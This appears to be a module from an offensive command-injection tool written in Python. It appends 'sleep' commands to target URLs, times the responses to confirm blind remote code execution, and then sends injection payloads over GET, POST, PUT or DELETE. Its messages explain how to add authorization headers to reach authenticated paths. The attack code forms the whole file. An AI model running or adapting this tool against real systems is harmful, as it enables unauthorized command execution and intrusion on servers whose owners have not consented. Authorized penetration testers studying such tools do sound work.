import requests  
import asyncio
import numpy as np
import json as jsn
from termcolor import colored
from rce import grace_period_sec
from  helpers.file import header_array_to_object

async def call(data):
    try:
        payload,method,headers,json,current_key,is_logs_enabled = data.values()
        obj_headers = (header_array_to_object(headers))
        elapse = 0.00
        if(method == 'GET'):
            try:
                req = requests.get(payload, data=jsn.dumps(json), headers=obj_headers)
                if(req):
                    if(req.elapsed):
                        elapse =  req.elapsed.total_seconds()
            except requests.exceptions.RequestException as e:
                print("[Exceptions]:", e)
        elif(method == 'POST'):
            try:
                req = requests.post(payload, data=jsn.dumps(json), headers=obj_headers)
                if(req):
                    if(req.elapsed):
                        elapse =  req.elapsed.total_seconds()
            except requests.exceptions.RequestException as e:
                print("[Exceptions]:", e)
        elif(method == 'PUT'):
            try:
                req = requests.put(payload, data=jsn.dumps(json), headers=obj_headers)
                if(req):
                    if(req.elapsed):
                        elapse =  req.elapsed.total_seconds()
            except requests.exceptions.RequestException as e:
                print("[Exceptions]:", e)
        elif(method == 'DELETE'):
            try:
                req = requests.delete(payload, data=jsn.dumps(json), headers=obj_headers)
                if(req):
                    if(req.elapsed):
                        elapse =  req.elapsed.total_seconds()
            except requests.exceptions.RequestException as e:
                print("[Exceptions]:", e)
        if(is_logs_enabled):
            print(colored("\r\r[LOG] ","green") + colored('Requested and got the response at %s' %(req.elapsed.total_seconds()),"white"))
        return {"key":current_key, "time":elapse}
    except SystemExit:
        pass
        
delays = [5, 10, 20]
call_i =  0
def vulnerability_check(data):
    target,method,headers,json = data.values()
    try:
        loop = asyncio.new_event_loop()
        tasks = list()
        async def create_tasks_func():
            for delay in delays:
                
                tasks.append(asyncio.create_task(vulnerability_check_call({
                    "target":target + ' sleep %s'%(delay),
                    "method":method,
                    "delay":delay,
                    "headers":headers,
                    "json":json,
                })))
            await asyncio.wait(tasks)
        loop.run_until_complete(create_tasks_func())
        loop.close()
        
        res = []
        for t in tasks:
            res.append(t.result())
        
        res = np.arange(len(res))[res]
        
        if(len(res) == 1):
            print(colored("\n[X] The target responded once(1). In order to proceed, there must be at least two(2) passed in vulnerability checks.","red"))
            return False
        elif(len(res) == 2):
            print(colored("\n[✔] The target responded twice(2). The script will proceed with the injection of payloads.","yellow"))
            return True
        elif(len(res) == 3):
            print(colored("\n[✔] Great. The target responded to all our tests. The script will proceed with the injection of payloads.","green"))
            return True
        else:
            print(colored("\n[X] The target is not vulnerable to Remote Code Execution (RCE). If you are sure that this is vulnerable, check the method you assigned, check if the target path is authenticated. If that is so, you have to add authorization or bearer to the headers and try it again. ","red"))
            return False
        
    except SystemExit:
        pass
  
async def vulnerability_check_call(data):
    target,method,delay,headers,json = data.values()
    obj_headers = (header_array_to_object(headers))
    try:
        global call_i
        req = ""
        call_i +=1
        print(colored("\r\r[VULNERABILITY CHECK] ","yellow") + colored('[%s/%s]' %(call_i, len(delays)),"white"))
        if(method == 'GET'):
            try:
                req = requests.get(target, data=jsn.dumps(json), headers=obj_headers)
            except requests.exceptions.RequestException as e:
                print("[Exceptions]:", e)
        elif(method == 'POST'):
            try:
                req = requests.post(target, data=jsn.dumps(json), headers=obj_headers)
            except requests.exceptions.RequestException as e:
                print("[Exceptions]:", e)
        elif(method == 'PUT'):
            try:
                req = requests.put(target, data=jsn.dumps(json), headers=obj_headers)
            except requests.exceptions.RequestException as e:
                print("[Exceptions]:", e)
        elif(method == 'DELETE'):
            try:
                req = requests.delete(target, data=jsn.dumps(json), headers=obj_headers)
            except requests.exceptions.RequestException as e:
                print("[Exceptions]:", e)
        if(req):
            if(req.elapsed):
                if float(req.elapsed.total_seconds()) + grace_period_sec >= float(delay):
                    print(colored("\r\rPASSED: ","green") + colored("[","white") + colored("✔","green") + colored("] The target responded to our payload checking(%s)" %(call_i),"white"))
                    return True
                else :
                    print(colored("\r\rFAILED: ","red") + colored("[","red") + colored("X","red") + colored("] The target did not responded to our payload checking(%s)" %(call_i),"red"))
                    return False
        print(colored("\r\rFAILED: ","red") + colored("[","red") + colored("X","red") + colored("] The target did not responded to our payload checking(%s)" %(call_i),"red"))
        return False
    except SystemExit:
        pass
